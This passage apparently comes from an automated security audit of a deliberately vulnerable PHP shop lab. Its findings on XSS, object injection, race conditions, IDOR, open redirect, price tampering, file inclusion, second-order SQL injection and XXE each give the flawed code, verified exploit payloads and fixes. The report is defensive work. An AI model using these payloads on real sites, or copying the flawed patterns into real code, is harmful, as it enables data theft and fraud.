    5  page('在线留言',function()use($rows){echo '<section class="panel"><h2>和我们聊聊</h2><form method="post">'.csrf_field().'<label>你的留言<textarea name="message" required></textarea></label><button>提交留言</button></form></section><div class="messages">';foreach($rows as$row)echo '<article class="panel"><strong>'.h($row['display_name']).'</strong><time>'.h($row['created_at']).'</time><div class="message-body">'.$row['message'].'</div></article>';echo '</div>';},'客服与帮助');
```

### C-05 catalog/greeting.php 的 name 参数未编码导致反射型 XSS

- 当前版本：finding `5d49941ea36b4c14aaba5cec95eb33ce` revision 1（项目版本 20）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/catalog/greeting.php:3`；文件：`lab30-shop/app/src/bootstrap.php`
- 证据引用：`5220b9ce518719f6` lab30-shop/app/src/bootstrap.php:10-10；`b06ddb554b7c114a` lab30-shop/app/public/catalog/greeting.php:1-3
- 根因类别：task_goal:v2:b295df3fd30afdc23b05:1（规范类型 xss_r）

**结论陈述（模型产出，不是证据）**

greeting.php 第2行将 $_GET['name'] 强制转为字符串，第3行在 <h2>你好，'.$name.'</h2> 中直接输出，未使用 h()。攻击者可构造 ?name=<script>... 的链接，受害者点击后脚本在页面上下文执行。

- 攻击前身份与适用前提：受害者点击包含恶意 name 参数的 URL
- 入口 → 传播 → 危险操作/状态变更：$_GET['name']（第2行） → $name=(string)$_GET['name'] -> echo '<h2>你好，'.$name.'</h2>' → echo 未编码的 $name 到 HTML
- 防护与边界：无；form_input 会编码回填值，但第3行直接输出未编码
- 静态判读：证据已记录
- 动态验证：动态确认（verification `4f7927f03e3e49a385c4f0c68a0b9cff`）
- 正式终审：独立批次 d5f64cb796ee41358a821d1b6947975e；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

访问 /catalog/greeting.php?name=%3Cscript%3Ealert%28%27XSS5d49941e%27%29%3C%2Fscript%3E，浏览器实际弹出 dialog：dialogs=["XSS5d49941e"]，console_errors=[]；页面 body_text 在“你好，”后为空（script 被解析执行而非作为文本显示），即 $_GET['name'] 未经 h() 编码直接进入 <h2> 并被浏览器执行。

- 评分依据：CVSS 3.1 待评分；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：改为 '<h2>你好，'.h($name).'</h2>'。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/src/bootstrap.php:10-10`（sha256 `2050819d093be02b…`）

```php
   10  function h(mixed $s): string { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
```

`lab30-shop/app/public/catalog/greeting.php:1-3`（sha256 `8e6db315fdfc32cf…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';$name=(string)($_GET['name']??'拾光的朋友');
    3  page('到店欢迎',function()use($name){echo '<section class="panel"><h2>你好，'.$name.'</h2><p>愿今天也有值得期待的小事。</p><form method="get">';form_input('name','你的称呼');echo '<button>生成欢迎信息</button></form></section>';},'商品目录');
```

### C-06 会员备份恢复对 POST 数据直接 unserialize 导致 PHP 对象注入

- 当前版本：finding `e4c0d7fa5c0640dbb7e81a774b02ae04` revision 1（项目版本 3）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/account/backup.php:5`；文件：`lab30-shop/app/public/account/backup.php`
- 证据引用：`f15ec397a921596f` lab30-shop/app/public/account/backup.php:2-6；`9d0d13b19a80b9a2` lab30-shop/app/src/backup.php:2-5
- 根因类别：task_goal:v2:a7f17a39bc25233b20bf:1（规范类型 insecure_deserialization）

**结论陈述（模型产出，不是证据）**

第4行把 $_POST['backup'] 做 base64_decode 后，第5行直接 unserialize($raw)，未设置 allowed_classes 白名单。instanceof MemberBackup 校验发生在反序列化之后，无法阻止任意类实例化与属性注入；第6行再把 $restored->tier / $restored->displayName 写入 users 表。

- 攻击前身份与适用前提：攻击者拥有有效账号与会话，并取得 CSRF token
- 入口 → 传播 → 危险操作/状态变更：POST 参数 backup（base64 编码的序列化字符串） → $_POST['backup'] -> base64_decode -> unserialize -> $restored 属性 -> UPDATE users SET tier,display_name → unserialize($raw) 反序列化未受信任用户数据
- 防护与边界：check_csrf() 只防 CSRF；require_user() 只要求登录；instanceof 检查在反序列化之后
- 静态判读：证据已记录
- 动态验证：动态确认（verification `9f82013c84b34113815d19b0df3c6c99`）
- 正式终审：独立批次 d5f64cb796ee41358a821d1b6947975e；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧提交伪造的序列化对象（base64: TzoxMjoiTWVtYmVyQmFja3VwIjoyOntzOjQ6InRpZXIiO3M6NDoiZ29sZCI7...）即 O:12:"MemberBackup":2:{s:4:"tier";s:4:"gold";s:11:"displayName";s:10:"PWNED_e4c0";}。服务端返回 RESTORE_ATTACK 200 且含“会员备份已恢复”；随后重新 GET 备份页并解析导出，得到 EXPORT2 O:12:"MemberBackup":2:{s:4:"tier";s:4:"gold";s:11:"displayName";s:10:"PWNED_e4c0";}，说明攻击者指定的属性已被 unserialize 并写入 users（宿主 postcondition 记录 tier standard→gold）。

- 评分依据：CVSS 3.1 待评分；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：改用 JSON 并显式校验字段，或 unserialize 传入 ['allowed_classes'=>['MemberBackup']]，并对 tier 做白名单校验

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/account/backup.php:2-6`（sha256 `017e1703cdf0ff0c…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';require __DIR__.'/../../src/backup.php';$u=require_user();$obj=new MemberBackup();$obj->tier=$u['tier'];$obj->displayName=$u['display_name'];$export=base64_encode(serialize($obj));$notice='';
    3  if($_SERVER['REQUEST_METHOD']==='POST'){
    4      check_csrf();$raw=base64_decode((string)($_POST['backup']??''),true);if($raw===false)fail_request('备份格式不正确。');
    5      $restored=unserialize($raw);if(!$restored instanceof MemberBackup)fail_request('不是有效的会员备份。');
    6      db()->prepare('UPDATE users SET tier=?,display_name=? WHERE id=?')->execute([$restored->tier,$restored->displayName,$u['id']]);event_log('restore_member_backup');$notice='会员备份已恢复。';
```

`lab30-shop/app/src/backup.php:2-5`（sha256 `571459cc8b0f6e8e…`）

```php
    2  class MemberBackup {
    3      public string $tier = 'standard';
    4      public string $displayName = '会员';
    5  }
```

### C-07 提现先读后写无锁，競态可重复扣减同一余额实现超额提现

- 当前版本：finding `168e43edeee643d6a8d80cfc004090ba` revision 1（项目版本 28）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/wallet/withdraw.php:7`；文件：`lab30-shop/app/public/wallet/withdraw.php`
- 证据引用：`22402245fecc9056` lab30-shop/app/public/wallet/withdraw.php:1-11
- 根因类别：task_goal:v2:86d9568e3fbce0e7b755:1（规范类型 race_condition）

**结论陈述（模型产出，不是证据）**

withdraw.php 第4行 SELECT balance，第5行比较 $balance<$amount，第6行 usleep(350000) 放大窗口，第7行 UPDATE users SET balance=? WHERE id=? 只按 id 更新为预读值减金额，无 WHERE balance>=? 条件也无事务/行锁；第8行再插入 withdrawals。并发请求都能通过余额检查并各自扣减，造成总提现超过实际余额。

- 攻击前身份与适用前提：已登录用户，持有有效 CSRF token，可并发发送带同一 token 的请求
- 入口 → 传播 → 危险操作/状态变更：POST 参数 amount → $_POST['amount'] -> $amount -> 余额检查 -> UPDATE balance -> INSERT withdrawals → 无条件 UPDATE 余额并按旧余额插入提现记录
- 防护与边界：仅金额范围校验与 csrf；无 SELECT FOR UPDATE、无事务、无余额条件更新
- 静态判读：缺上下文（2 项）；缺失上下文：products 表结构（价格列名）与 orders.unit_price 用途未读取 schema，仅从 create.php 行为推断；backup.php 引用的 src/backup.php 中 MemberBackup 类定义未读取
- 动态验证：动态确认（verification `744d525c729f48a1ae477f75774c6237`）
- 正式终审：独立批次 3ef9a0cf6d0b4b79b90a150c1b78135e；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧在同一会话、同一 csrf token 下用线程屏障并发发出 3 个 POST /wallet/withdraw.php（amount=80）。三笔全部返回 200 且 JSON 均为 {"status":"paid","amount":80,"balance":20}，回执 id 分别为 3、1、2（互不相同）；随后读取当前用户，balance 为 "20.00"。初始余额仅 100.00，实际支付 3×80=240，余额却只按一次 100-80 扣减，超额提现 140，验证了先读后写丢失更新。

- 评分依据：CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：使用事务并在 UPDATE 中带 balance>=? 条件按 rowCount 判断，或 SELECT ... FOR UPDATE 锁定用户行；删除 usleep。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/wallet/withdraw.php:1-11`（sha256 `e3e73271e379b085…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();require_post();check_csrf();$amount=filter_var($_POST['amount']??null,FILTER_VALIDATE_FLOAT);if($amount===false||$amount<=0||$amount>10000)fail_request('提现金额不正确。');
    3  $id=(int)$u['id'];session_write_close();
    4  $q=db()->prepare('SELECT balance FROM users WHERE id=?');$q->execute([$id]);$balance=(float)$q->fetchColumn();
    5  if($balance<$amount)fail_request('账户余额不足，请调整提现金额。',409);
    6  usleep(350000);
    7  $q=db()->prepare('UPDATE users SET balance=? WHERE id=?');$q->execute([$balance-$amount,$id]);
    8  $q=db()->prepare('INSERT INTO withdrawals(user_id,amount) VALUES(?,?)');$q->execute([$id,$amount]);
    9  $receipt=(int)db()->lastInsertId();
   10  if(str_contains($_SERVER['HTTP_ACCEPT']??'','application/json'))json_response(['status'=>'paid','amount'=>$amount,'balance'=>$balance-$amount,'receipt_id'=>$receipt]);
   11  header('Location: /wallet/index.php?receipt='.$receipt,true,303);exit;
```

### C-08 orders/detail.php 仅按订单 id 查询、无用户归属校验，任意登录用户可读他人订单

- 当前版本：finding `6f9baa7bb5694f4e8d2f1635f38c7d9f` revision 1（项目版本 33）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/orders/detail.php:2`；文件：`lab30-shop/app/public/orders/detail.php`
- 证据引用：`171ea369e07c383b` lab30-shop/app/public/orders/detail.php:1-4；`490c7d72eb514d6b` lab30-shop/app/public/orders/index.php:2-2；`78224482780bf94a` lab30-shop/app/src/bootstrap.php:33-37
- 根因类别：task_goal:v2:6c8f4a83cc83853f054e:1（规范类型 idor）

**结论陈述（模型产出，不是证据）**

detail.php 以 require_user() 只校验登录状态，随后执行 SELECT ... FROM orders o JOIN users u ... WHERE o.id=? 且仅绑定 $_GET['id']，未加入 user_id=当前用户 的归属条件；查询结果无论属主直接渲染 order_no、购买人、数量、实付金额与 private_note，并在 Accept 含 application/json 时原样 json_response 全量字段。因此任意已登录用户遍历 id 即可越权读取其他用户订单（含私密备注）。对照 index.php 以 user_id=? 绑定当前用户，可见详情页缺失该约束。

- 攻击前身份与适用前提：攻击者拥有任意已登录账号；目标订单 id 可枚举（自增主键）
- 入口 → 传播 → 危险操作/状态变更：GET 参数 id（$_GET['id']??0），由任意登录用户控制 → detail.php:2 $q->execute([$_GET['id']??0]) → detail.php:3/4 输出订单字段 → 按对象 id 读取订单并在 HTML/JSON 中输出他人订单数据（含 private_note）
- 防护与边界：require_user() 仅验证已登录；未按 user_id 过滤，也未做角色判断，无归属校验
- 静态判读：证据已记录
- 动态验证：动态确认（verification `fd65cc79adbc45689c06b934124d451f`）
- 正式终审：独立批次 3ef9a0cf6d0b4b79b90a150c1b78135e；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧：同一 alice 会话（其订单中心仅列出 detail.php?id=1，即本人唯一订单）请求 /orders/detail.php?id=2 并带 Accept: application/json，返回 200，正文为 {"id":2,"order_no":"SG-1002",...,"user_id":2,"username":"bob",...,"total":"158.00","private_note":"BOB_PRIVATE_ORDER_gift_for_family"}，即 alice（user_id=1）成功读取了 bob 的订单号、金额与私密配送备注，且未被 403/404 拦截。

- 评分依据：CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：在查询中加入归属条件：WHERE o.id=? AND o.user_id=?（或管理员角色另行判定），并先取当前用户 id 绑定执行；无归属时不返回数据。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/orders/detail.php:1-4`（sha256 `be69aa78cecffcfd…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require_user();$q=db()->prepare('SELECT o.*,u.username,p.name FROM orders o JOIN users u ON u.id=o.user_id LEFT JOIN products p ON p.id=o.product_id WHERE o.id=?');$q->execute([$_GET['id']??0]);$o=$q->fetch();if(!$o)fail_request('订单不存在。',404);
    3  if(str_contains($_SERVER['HTTP_ACCEPT']??'','application/json'))json_response($o);
    4  page('订单详情',function()use($o){echo '<section class="panel"><span class="badge">等待配送</span><h2>'.h($o['order_no']).'</h2><dl>';foreach(['商品'=>$o['name'],'购买人'=>$o['username'],'数量'=>$o['quantity'],'实付金额'=>'¥'.$o['total'],'配送备注'=>$o['private_note']]as$k=>$v)echo '<dt>'.h($k).'</dt><dd>'.h($v).'</dd>';echo '</dl><a class="button secondary" href="/orders/index.php">返回订单中心</a></section>';},'订单中心');
```

`lab30-shop/app/public/orders/index.php:2-2`（sha256 `633f73e04b427bba…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();$q=db()->prepare('SELECT o.*,p.name FROM orders o LEFT JOIN products p ON p.id=o.product_id WHERE user_id=? ORDER BY o.id DESC');$q->execute([$u['id']]);$orders=$q->fetchAll();
```

`lab30-shop/app/src/bootstrap.php:33-37`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
```

### C-09 auth/continue.php 的 next 参数未校验即写入 Location 头，导致开放重定向

- 当前版本：finding `d5eedb8664a24e029b3279ca593c5f5b` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/auth/continue.php:3`；文件：`lab30-shop/app/public/auth/continue.php`
- 证据引用：`3d07985381125c49` lab30-shop/app/public/auth/continue.php:1-4；`6220461f4c36cb1a` lab30-shop/app/src/bootstrap.php:33-36
- 根因类别：task_goal:v2:e4d5ccd2f12c486d1548:1（规范类型 open_redirect）

**结论陈述（模型产出，不是证据）**

continue.php 先调用 require_user() 要求登录，随后若存在 $_GET['next'] 就直接 header('Location: '.(string)$_GET['next'])。该值未经同源、协议或白名单校验，可填入 https://evil.example 等外部地址，浏览器即跳转至攻击者站点，造成开放重定向，可用于钓鱼与凭据窃取。

- 攻击前身份与适用前提：受害者已登录（require_user），点击带 next 外部 URL 的链接
- 入口 → 传播 → 危险操作/状态变更：$_GET['next'] → continue.php:3 isset($_GET['next']) -> 直接拼接进 Location 头 → header('Location: '.$_GET['next'])
- 防护与边界：无：未使用相对路径校验、parse_url 主机比对或允许列表
- 静态判读：缺上下文（1 项）；缺失上下文：lab30-shop/app/public/auth/logout.php 未读取，其登出跳转与会话销毁逻辑未审计
- 动态验证：动态确认（verification `e4de227ef7384be4b810a326c0a3118a`）
- 正式终审：独立批次 3ef9a0cf6d0b4b79b90a150c1b78135e；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

同一已登录 alice 会话访问 /auth/continue.php?next=https://evil.example/phish?next=1（next 参数 URL 编码后传入），返回 302，Location 头为 'https://evil.example/phish?next=1'，响应体为空：服务端将未校验的外部地址原样写入 Location，浏览器会跳转至攻击者站点。作为前置对照，未登录访客访问同一 URL 返回 401（Location 为 None），说明该路径确实先要求登录，登录用户才会触发外跳。

- 评分依据：CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：仅允许以 / 开头的站内相对路径，或解析后校验 host 属于本站，否则回退到默认页。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/auth/continue.php:1-4`（sha256 `50fde4a15e52af44…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require_user();
    3  if(isset($_GET['next'])){header('Location: '.(string)$_GET['next']);exit;}
    4  page('继续访问',function(){echo '<section class="panel"><h2>选择下一站</h2><form method="get">';form_input('next','继续访问地址','/orders/index.php');echo '<button>继续</button></form></section>';});
```

`lab30-shop/app/src/bootstrap.php:33-36`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
```

### C-10 订单创建信任客户端提交的 price，可任意低价下单

- 当前版本：finding `7c8e155d6b5741d7be73c3dab2bc6a10` revision 1（项目版本 34）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/orders/create.php:5`；文件：`lab30-shop/app/public/orders/create.php`
- 证据引用：`0665b79989f38035` lab30-shop/app/public/orders/create.php:1-7
- 根因类别：task_goal:v2:b3bb19544ab7521f4892:1（规范类型 price_manipulation）

**结论陈述（模型产出，不是证据）**

orders/create.php 第3行从 $_POST['price'] 取值，第4行只校验 $price===false 或 $price<0，第5行用 $total=round($price*$quantity,2)，第6-7行把该 price 写入 orders.unit_price 与 total。产品价格来自 $p 但从未用于计算，攻击者可提交 price=0 以零元下单并正常扣减库存。

- 攻击前身份与适用前提：已登录用户，持有有效 CSRF token
- 入口 → 传播 → 危险操作/状态变更：POST 参数 price、quantity、product_id → $_POST['price'] -> filter_var -> $price -> $total 及 INSERT unit_price/total → INSERT orders 使用客户端价格作为成交单价与总额
- 防护与边界：仅校验非负与数量范围，无服务端价格重算；csrf 不防篡改
- 静态判读：缺上下文（2 项）；缺失上下文：products 表结构（价格列名）与 orders.unit_price 用途未读取 schema，仅从 create.php 行为推断；backup.php 引用的 src/backup.php 中 MemberBackup 类定义未读取
- 动态验证：动态确认（verification `a3d460088f1742eab5d3c91533f0cee4`）
- 正式终审：独立批次 a809fe0264524f398fde6d49b7c8808a；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧对同一商品提交 product_id=1、quantity=1、price=0（csrf 真实）：POST /orders/create.php 返回 200 并跳转订单 id=4，订单详情显示“商品 晨光手冲壶 / 购买人 alice / 数量 1 / 实付金额 ¥0.00”，订单号 SG-d25bc79805。服务端接受了客户端价格并生成 0 元订单。

- 评分依据：CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：服务端从 products 表读取单价计算总额，忽略客户端 price；对金额与库存变更使用事务与条件更新。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/orders/create.php:1-7`（sha256 `41e73625d7e04c58…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();require_post();check_csrf();
    3  $q=db()->prepare('SELECT * FROM products WHERE id=?');$q->execute([$_POST['product_id']??0]);$p=$q->fetch();$quantity=filter_var($_POST['quantity']??0,FILTER_VALIDATE_INT);$price=filter_var($_POST['price']??null,FILTER_VALIDATE_FLOAT);
    4  if(!$p||!$quantity||$quantity<1||$quantity>20||$price===false||$price<0)fail_request('商品、数量或价格不正确。');
    5  $total=round($price*$quantity,2);$pdo=db();$pdo->beginTransaction();
    6  $q=$pdo->prepare('UPDATE products SET stock=stock-? WHERE id=? AND stock>=?');$q->execute([$quantity,$p['id'],$quantity]);if(!$q->rowCount()){$pdo->rollBack();fail_request('商品库存不足。',409);}
    7  $q=$pdo->prepare('INSERT INTO orders(order_no,user_id,product_id,quantity,unit_price,total,private_note) VALUES(?,?,?,?,?,?,?)');$q->execute(['SG-'.bin2hex(random_bytes(5)),$u['id'],$p['id'],$quantity,$price,$total,'会员订单，等待发货']);$id=(int)$pdo->lastInsertId();$pdo->commit();event_log('create_order',['order_id'=>$id,'total'=>$total]);header('Location: /orders/detail.php?id='.$id, true,303);
```

### C-11 content/page.php 本地文件包含：未过滤 page 参数拼接 include 路径

- 当前版本：finding `5783491e92f4458082050a3863ac0095` revision 1（项目版本 32）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/content/page.php:3`；文件：`lab30-shop/app/public/content/page.php`
- 证据引用：`173f24f6297d9164` lab30-shop/app/public/content/page.php:1-3；`38c5cad78d49b7f3` lab30-shop/docker/php.ini:1-13
- 根因类别：task_goal:v2:42d65f63502f4ca2e157:1（规范类型 lfi）

**结论陈述（模型产出，不是证据）**

$_GET['page'] 强制转 string 后直接拼接进 include 路径，仅添加 .php 后缀，未做 basename/白名单/realpath 约束。传 page=../../src/bootstrap 可包含 bootstrap；传 page=../../../../etc/passwd%00 在旧 PHP 可截断（8.4 不支持），主要用于读取应用源码与配置片段，泄露 DB 凭据等敏感信息。allow_url_include=On 使其在 include 路径被解释为 URL 时也可能升级为 RFI。

- 攻击前身份与适用前提：攻击者可访问 /content/page.php；无需登录
- 入口 → 传播 → 危险操作/状态变更：GET /content/page.php?page= 参数 → page.php:2 取 $_GET['page'] -> page.php:3 include APP_ROOT.'/resources/views/'.$name.'.php' → include 动态拼接路径
- 防护与边界：无 basename/白名单/realpath；open_basedir 未设置（php.ini 全文 13 行未见）
- 静态判读：证据已记录
- 动态验证：动态确认（verification `59ab40b5d9404e2a9edbdf32cf344c4e`）
- 正式终审：独立批次 a809fe0264524f398fde6d49b7c8808a；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧：alice 会话 GET /content/page.php?page=..%2F..%2Fsrc%2Fbootstrap 返回 200，但正文在 page-heading（“内容中心” h1）处即结束，content-length 690，缺少正常页面必有的“?page=home/配送与售后”链接区和 footer，说明 include 在输出该 section 之前发生致命中止；即路径 ../.. 已解析到 APP_ROOT/resources/views/../../src/bootstrap.php = app/src/bootstrap.php（该文件已被外层 page.php require，重复包含触发函数重复声明致命错误）。

- 评分依据：CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：对 page 使用白名单或 basename 并 realpath 校验目录前缀；设置 open_basedir；关闭 allow_url_include。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/content/page.php:1-3`（sha256 `53c5997117f2d54c…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';$name=(string)($_GET['page']??'home');
    3  page('内容中心',function()use($name){include APP_ROOT.'/resources/views/'.$name.'.php';echo '<section class="panel"><a href="?page=home">商城介绍</a> · <a href="?page=shipping">配送与售后</a></section>';},'内容中心');
```

`lab30-shop/docker/php.ini:1-13`（sha256 `b65de9007c7f42b3…`）

```
    1  date.timezone = Asia/Shanghai
    2  allow_url_fopen = On
    3  allow_url_include = On
    4  display_errors = Off
    5  log_errors = On
    6  error_reporting = E_ALL & ~E_DEPRECATED
    7  session.use_strict_mode = 0
    8  session.save_path = /var/lib/shop/sessions
    9  memory_limit = 128M
   10  post_max_size = 2M
   11  max_execution_time = 15
   12  default_socket_timeout = 4
   13  expose_php = Off
```

### C-12 会员报表 nickname 二次 SQL 注入（用户资料写入后未参数化拼接）

- 当前版本：finding `5aff729ccaaa4480a9e526a947f58de9` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/report.php:3`；文件：`lab30-shop/app/public/ops/report.php`
- 证据引用：`667c91ac7c21aa66` lab30-shop/app/public/ops/report.php:2-3；`ec18381d7af73d0f` lab30-shop/app/public/account/update.php:4-6；`85b2e45ff4e8d0eb` lab30-shop/app/src/bootstrap.php:4-8
- 根因类别：task_goal:v2:6ba26731387ec942fc48:1（规范类型 sqli）

**结论陈述（模型产出，不是证据）**

ops/report.php 第2行按 user_id 用占位符取出 nickname，第3行却把该 nickname 直接拼接进 `WHERE nickname='...'` 交给 db()->query() 执行，未做任何转义。nickname 可由任意登录用户在 account/update.php 第5-6行通过 POST nickname 写入（该处为参数化 UPDATE，仅存储，不做 SQL 转义），形成存储/二次注入。operator/admin 访问报表时，攻击者控制的 nickname 内容被当作 SQL 执行，可读出任意表数据。

- 攻击前身份与适用前提：攻击者需一个可注册的普通账号以改写自己的 nickname；触发需 operator/admin 打开含其 user_id 的报表（如 ?user_id=<攻击者id>）
- 入口 → 传播 → 危险操作/状态变更：用户资料字段 nickname（POST 到 /account/update.php），再经 /ops/report.php?user_id=<id> 读出 → POST nickname -> UPDATE users 参数化写入 -> report.php:2 prepare 读取 $nickname -> report.php:3 字符串拼接 -> db()->query() 执行 → PDO::query() 执行包含用户可控 nickname 的 SQL
- 防护与边界：report.php 第2行只保护了 user_id；第3行对已存 nickname 无转义或占位符；h() 仅用于 HTML 输出，不用于 SQL
- 静态判读：证据已记录
- 动态验证：动态确认（verification `bb8cdae9a5ce4a3daeab27ead8ed01a7`）
- 正式终审：独立批次 a2e9390ff52c42228640780e7c39d3df；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

alice 通过 GET /account/update.php 取真实 csrf 后 POST nickname=Payload，UPDATE_STATUS 200，响应 JSON nickname 原样为 `x' UNION SELECT username,email,role FROM users-- -`（STORED_NICKNAME 一致，NICKNAME_MATCH True）。随后同一 operator 身份 GET /ops/report.php?user_id=1 返回 200（content-length 996），tbody 变为四行：alice/alice@shop.local/customer、bob/bob@shop.local/customer、operator/ops@shop.local/operator、admin/admin@shop.local/admin，即 UNION SELECT 的 users 全表结果，证明存储的 nickname 被拼接执行。

- 评分依据：CVSS 3.1 Base 4.8 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：未提供

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/report.php:2-3`（sha256 `90d7d60d44815374…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user(['operator','admin']);$id=(int)($_GET['user_id']??1);$q=db()->prepare('SELECT nickname FROM users WHERE id=?');$q->execute([$id]);$nickname=$q->fetchColumn();if($nickname===false)fail_request('会员不存在。',404);
    3  $rows=db()->query("SELECT username,email,role FROM users WHERE nickname='".$nickname."'")->fetchAll();
```

`lab30-shop/app/public/account/update.php:4-6`（sha256 `b8227f19c05d0cd3…`）

```php
    4      check_csrf();$columns=['display_name','email','role','balance','tier','nickname','homepage'];$set=[];$values=[];
    5      foreach($_POST as$key=>$value)if(in_array($key,$columns,true)){$set[]='`'.$key.'`=?';$values[]=(string)$value;}
    6      if(!$set)fail_request('没有可更新的资料。');$values[]=$u['id'];db()->prepare('UPDATE users SET '.implode(',',$set).' WHERE id=?')->execute($values);event_log('update_profile',['fields'=>array_keys($_POST)]);$notice='资料已保存。';$u=user();
```

`lab30-shop/app/src/bootstrap.php:4-8`（sha256 `2050819d093be02b…`）

```php
    4  function db(): PDO {
    5      static $pdo;
    6      if (!$pdo) $pdo = new PDO('mysql:host=' . (getenv('DB_HOST') ?: 'db') . ';dbname=' . (getenv('DB_NAME') ?: 'shop') . ';charset=utf8mb4', getenv('DB_USER') ?: 'shop', getenv('DB_PASSWORD') ?: 'shop-local-password', [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC, PDO::ATTR_EMULATE_PREPARES => false]);
    7      return $pdo;
    8  }
```

### C-13 xml-import.php 以 LIBXML_NOENT|LIBXML_DTDLOAD 解析用户 XML 造成 XXE 文件读取

- 当前版本：finding `addbc91072b7478c8aa7d68521c49c73` revision 1（项目版本 30）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/xml-import.php:3`；文件：`lab30-shop/app/public/ops/xml-import.php`
- 证据引用：`c7321e7900aae64d` lab30-shop/app/public/ops/xml-import.php:2-4；`4eba9252f833f919` lab30-shop/app/src/bootstrap.php:38-40
- 根因类别：task_goal:v2:f43b5a14a0bf63b2514c:1（规范类型 xxe）

**结论陈述（模型产出，不是证据）**

xml-import.php:3 对 $_POST['xml'] 不做过滤即调用 simplexml_load_string 且带 LIBXML_NOENT&#124;LIBXML_DTDLOAD，允许外部 DTD 与实体展开；结果 $doc->title 在第4行回显。check_csrf 可用自身 token 通过，不构成实质性防护。

- 攻击前身份与适用前提：持有 operator 或 admin 会话并取得 csrf token，POST /ops/xml-import.php
- 入口 → 传播 → 危险操作/状态变更：POST 参数 xml（operator/admin 会话，附自身 csrf token） → $_POST['xml'] -> (string) -> simplexml_load_string(...,LIBXML_NOENT&#124;LIBXML_DTDLOAD) -> $doc->title -> h($output) → simplexml_load_string 启用外部实体/DTD 加载
- 防护与边界：仅角色门禁与 CSRF 校验；未使用 LIBXML_NONET，也未拒绝 DOCTYPE/ENTITY
- 静态判读：证据已记录
- 动态验证：动态确认（verification `b0718b254f184a23ae8be62f7f8ccf3c`）
- 正式终审：独立批次 a2e9390ff52c42228640780e7c39d3df；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

